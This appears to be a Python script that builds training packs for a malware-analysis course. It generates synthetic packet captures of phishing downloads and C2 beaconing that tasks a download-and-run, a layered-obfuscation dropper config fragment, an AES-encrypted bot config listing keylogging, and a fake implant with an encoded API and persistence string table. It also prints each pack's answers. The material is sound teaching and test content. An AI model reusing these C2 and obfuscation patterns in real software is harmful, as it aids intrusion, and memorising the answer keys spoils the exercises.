# SPDX-License-Identifier: AGPL-3.0-or-later
"""Builds the files of the Learn practice packs (packs/learn-*): captures,
samples and the long scenario of learn-replay. Deterministic: running it again
makes the same bytes. Run from the repository root:

    python3 tools/learn/build.py

It prints each pack's answer, for `pack-tool hash`. See docs/learn.md.
"""

import base64
import hashlib
import hmac
import json
import os
import random
import sys
import urllib.parse
import zlib

sys.path.insert(0, os.path.dirname(__file__))
from pcaplib import Capture, request, response  # noqa: E402

ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
CLIENT = "10.1.4.23"
DNS = "10.1.4.1"
FIREFOX = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0"


def out(pack, name, data):
    d = os.path.join(ROOT, "packs", pack, "files")
    os.makedirs(d, exist_ok=True)
    mode = "wb" if isinstance(data, bytes) else "w"
    with open(os.path.join(d, name), mode) as f:
        f.write(data)


def browse(cap, host, ip, path, port, ctype, body, txid, status=(200, "OK"), extra=()):
    cap.dns(CLIENT, DNS, 50000 + txid, host, ip, txid)
    cap.wait(0.01)
    req = request("GET", path, host, [("User-Agent", FIREFOX), ("Accept", "*/*"), *extra])
    cap.http(CLIENT, ip, port, req, response(*status, [("Server", "nginx"), ("Content-Type", ctype)], body))


# ---- module 1: reading a pcap ----------------------------------------------------


def first_capture():
    cap = Capture(1764230400)  # 2025-11-27 08:00 UTC
    browse(cap, "news.example-daily.test", "198.51.100.20", "/", 49801, "text/html",
           "<html><head><title>Example Daily</title></head><body><h1>Headlines</h1></body></html>", 0x1101)
    cap.wait(1.4)
    browse(cap, "static.example-daily.test", "198.51.100.21", "/img/logo.png", 49802, "image/png",
           b"\x89PNG\r\n\x1a\n" + bytes(range(64)), 0x1102)
    cap.wait(6.2)
    browse(cap, "mail.corp-portal.test", "203.0.113.40", "/inbox?folder=new", 49803, "application/json",
           '{"unread":2,"messages":[{"from":"accounts@supplier-billing.test","subject":"Invoice 0921 overdue"}]}',
           0x1103)
    cap.wait(9.8)
    zip_body = b"PK\x03\x04\x14\x00\x00\x00\x08\x00" + bytes((i * 37) & 0xFF for i in range(900))
    browse(cap, "dl.quickdocs-share.test", "192.0.2.77", "/s/8fk2Lq/invoice_0921.zip", 49804, "application/zip",
           zip_body, 0x1104, extra=[("Referer", "http://mail.corp-portal.test/inbox?folder=new")])
    cap.wait(3.1)
    browse(cap, "news.example-daily.test", "198.51.100.20", "/sport", 49805, "text/html",
           "<html><body><h1>Sport</h1></body></html>", 0x1105)
    out("learn-first-capture", "capture.pcap", cap_bytes(cap))
    return "dl.quickdocs-share.test"


# ---- module 2: HTTP and C2 patterns -----------------------------------------------

OLD_UA = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"


def beacon():
    cap = Capture(1764234000)
    c2 = ("update.winsvc-telemetry.test", "203.0.113.200")
    port = 49900
    task_url = "http://files.winsvc-telemetry.test/p/kb5034441.exe"
    for i in range(8):
        if i == 2:
            browse(cap, "intranet.corp.test", "10.1.9.5", "/wiki/Main_Page", 49880, "text/html",
                   "<html><body>Intranet wiki</body></html>", 0x1200)
        if i == 5:
            browse(cap, "news.example-daily.test", "198.51.100.20", "/", 49881, "text/html",
                   "<html><body>Headlines</body></html>", 0x1201)
        body = f"id=WS-0193&st={'busy' if i == 4 else 'idle'}&n={i}"
        req = request("POST", "/gate.php", c2[0], [("User-Agent", OLD_UA),
                      ("Content-Type", "application/x-www-form-urlencoded")], body)
        if i == 4:
            reply = json.dumps({"cmd": "download", "url": task_url, "run": True})
            res = response(200, "OK", [("Server", "Apache"), ("Content-Type", "application/json")], reply)
        else:
            res = response(200, "OK", [("Server", "Apache"), ("Content-Type", "text/plain")], "OK")
        cap.http(CLIENT, c2[1], port + i, req, res)
        cap.wait(60.0 - 0.06)
    out("learn-beacon", "capture.pcap", cap_bytes(cap))
    return task_url


# ---- module 4: encodings ------------------------------------------------------------


def layers():
    key = 0x37
    c2 = "https://cdn-telemetry.mirrorsync.test/v2/ping"
    plain = f"c2={c2};sleep=90;jitter=20".encode()
    x = bytes(b ^ key for b in plain)
    step_hex = x.hex()
    step_url = urllib.parse.quote(step_hex, safe="")  # hex is unreserved: unchanged...
    # ...so percent-encode every other character, as the sample's packer does.
    step_url = "".join(f"%{ord(c):02X}" if i % 2 == 0 else c for i, c in enumerate(step_hex))
    blob = base64.b64encode(step_url.encode()).decode()
    src = f'''# Recovered from a dropper's memory. The analyst's comments start with ##.
import base64, urllib.parse

K = 0x37

CFG = (
{chr(10).join(f'    "{blob[i:i + 64]}"' for i in range(0, len(blob), 64))}
)


def unpack(blob):
    a = base64.b64decode(blob)            ## layer 1
    b = urllib.parse.unquote(a.decode())  ## layer 2
    c = bytes.fromhex(b)                  ## layer 3
    return bytes(x ^ K for x in c)        ## layer 4


def main():
    cfg = unpack(CFG).decode()
    settings = dict(part.split("=", 1) for part in cfg.split(";"))
    beacon(settings["c2"], int(settings["sleep"]), int(settings["jitter"]))
'''
    out("learn-layers", "dropper.py.txt", src)
    return "cdn-telemetry.mirrorsync.test"


# ---- module 5: crypto basics ---------------------------------------------------------


def aes_config():
    from cryptography.hazmat.primitives import padding
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

    campaign = "OPAL-17"
    key = hashlib.sha256(campaign.encode()).digest()
    iv = bytes.fromhex("6e65637230707379a1b2c3d4e5f60718")
    inner = json.dumps({"panel": "https://glasswing-ops.test/adm/", "bot_group": "wren-0417",
                        "modules": ["keylog", "screens"], "sleep": 300}, separators=(",", ":")).encode()
    padder = padding.PKCS7(128).padder()
    data = padder.update(inner) + padder.finalize()
    enc = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
    ct = enc.update(data) + enc.finalize()
    mac = hmac.new(key, iv + ct, hashlib.sha256).hexdigest()
    cfg = {
        "version": 3,
        "campaign": campaign,
        "cipher": "aes-256-cbc",
        "key_derivation": "sha256(campaign)",
        "iv": iv.hex(),
        "data": base64.b64encode(ct).decode(),
        "mac": mac,
    }
    out("learn-aes-config", "config.json", json.dumps(cfg, indent=2) + "\n")
    return "wren-0417"


# ---- module 6: strings and binary triage ----------------------------------------------


def string_table():
    rng = random.Random(6)
    ua = "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko SvcHost/3.2"
    profile = {"ua": ua, "path": "/content/ajax/refresh.php", "sleep": 45, "jitter": 0.3, "kill": "2026-12-31"}
    blob = base64.b64encode(zlib.compress(json.dumps(profile, separators=(",", ":")).encode(), 9)).decode()
    key = 0x1F
    table = ["kernel32.dll", "VirtualAlloc", "CreateThread", "WinHttpOpen", "WinHttpSendRequest",
             "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "svchost-update"]
    enc_table = b"".join(bytes(b ^ key for b in s.encode()) + bytes([key]) for s in table)
    body = bytearray()
    body += b"MZ\x90\x00" + bytes(60) + b"PE\x00\x00"
    body += bytes(rng.randrange(256) for _ in range(700))
    body += b"\x00\x00.text\x00\x00\x00.rdata\x00\x00.data\x00\x00\x00"
    body += bytes(rng.randrange(256) for _ in range(500))
    body += b"\x00STRTABLE" + bytes([key, len(table)]) + enc_table + b"\x00"
    body += bytes(rng.randrange(256) for _ in range(400))
    body += b"\x00GetProcAddress\x00LoadLibraryA\x00Sleep\x00"
    body += bytes(rng.randrange(256) for _ in range(300))
    body += b"\x00PRF1:" + blob.encode() + b"\x00"
    body += bytes(rng.randrange(256) for _ in range(600))
    out("learn-string-table", "implant.bin.sample", bytes(body))
    return ua


# ---- module 9: answering the door ------------------------------------------------------


def door():
    cap = Capture(1764241200)
    host, ip = "cdn-assets.lumenfeed.test", "203.0.113.150"
    ua = "Updater/5.1 (x64; channel=stable)"
    sess = "a3f09c71d2e84b56"
    body = base64.b64encode(b"WS-0441|jsmith|Windows 10 22H2").decode()
    req = request("POST", "/cdn/v3/collect", host, [("User-Agent", ua), ("X-Session", sess),
                  ("Content-Type", "text/plain")], body)
    task_hex = "2f63646e2f76332f6a2f3963316538326164"  # the sandbox's own task path, hex
    res = response(200, "OK", [("Server", "cloudflare"), ("Content-Type", "application/json")],
                   json.dumps({"ok": 1, "next": task_hex, "wait": 120}))
    browse(cap, "news.example-daily.test", "198.51.100.20", "/", 49950, "text/html",
           "<html><body>Headlines</body></html>", 0x1301)
    cap.wait(2.0)
    cap.dns(CLIENT, DNS, 50777, host, ip, 0x1302)
    cap.http(CLIENT, ip, 49951, req, res, sport=80)
    out("learn-door", "capture.pcap", cap_bytes(cap))
    strings_txt = """# strings -n 8 updater.exe (selected)
Updater/5.1 (x64; channel=stable)
X-Session
%016llx
%s|%s|%s
/cdn/v3/collect
next
wait
key
base64
"""
    out("learn-door", "strings.txt", strings_txt)
    return None  # live: the flag is per instance


# ---- module 7: scripting ---------------------------------------------------------------


def replay_scenario(pages=30):
    lines = [
        "# Generated by tools/learn/build.py: run it again after changing this pack.",
        "ttl_minutes = 60",
        'flag_prefix = "pager"',
        "",
        "# The start: says how to authenticate and where page 1 is.",
        "[[route]]",
        'method = "GET"',
        'path = "/api/export"',
        "[route.respond]",
        'content_type = "application/json"',
        "body = '{\"pages\":%d,\"auth\":\"send X-Api-Key: {{d:apikey}} with every page\",\"first\":\"/api/export/{{d:p01}}\"}'" % pages,
        "",
    ]
    for n in range(1, pages + 1):
        cur = f"p{n:02d}"
        nxt = f"p{n + 1:02d}"
        needs = f'needs = ["{f"seen{n - 1:02d}"}"]' if n > 1 else ""
        if n < pages:
            body = "'{\"page\":%d,\"records\":%d,\"next\":\"/api/export/{{d:%s}}\"}'" % (n, 40 + (n * 7) % 13, nxt)
        else:
            body = "'{\"page\":%d,\"records\":3,\"next\":null,\"export_id\":\"{{flag}}\"}'" % n
        lines += [
            "[[route]]",
            'method = "GET"',
            f'path = "/api/export/{{{{d:{cur}}}}}"',
        ]
        if needs:
            lines.append(needs)
        lines += [
            f'sets = ["seen{n:02d}"]',
            "[route.when]",
            'header = { "x-api-key" = "{{d:apikey}}" }',
            "[route.respond]",
            'content_type = "application/json"',
            f"body = {body}",
            "",
        ]
    lines += [
        "# A page without the key, or out of order.",
        "[[route]]",
        'path = "/api/export/*"',
        "[route.respond]",
        "status = 403",
        'content_type = "application/json"',
        "body = '{\"error\":\"missing or wrong X-Api-Key, or a page asked for before the one that links to it\"}'",
        "",
    ]
    with open(os.path.join(ROOT, "packs", "learn-replay", "live.toml"), "w") as f:
        f.write("\n".join(lines))


def cap_bytes(cap):
    import tempfile

    with tempfile.NamedTemporaryFile(delete=False) as t:
        path = t.name
    cap.write(path)
    with open(path, "rb") as f:
        data = f.read()
    os.unlink(path)
    return data


if __name__ == "__main__":
    answers = {
        "learn-first-capture": first_capture(),
        "learn-beacon": beacon(),
        "learn-layers": layers(),
        "learn-aes-config": aes_config(),
        "learn-string-table": string_table(),
    }
    door()
    replay_scenario()
    for k, v in answers.items():
        print(f"{k}\t{v}")
